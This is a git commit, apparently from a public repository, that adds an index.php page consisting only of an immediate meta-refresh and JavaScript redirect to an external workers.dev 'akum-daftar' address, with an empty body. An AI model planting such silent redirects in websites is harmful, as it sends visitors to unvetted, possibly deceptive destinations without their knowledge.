68048b247b2a6f4d3771aaf1d41aac86be0d92ca
kenzroot216-lgtm <kenzroot216@gmail.com>
2025-12-10 05:49:57 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="refresh" content="0; url=https://akum-daftar.grezz1223.workers.dev/">
+    <script>
+      location.replace("https://akum-daftar.grezz1223.workers.dev/");
+    </script>
+  </head>
+  <body></body>
+</html>
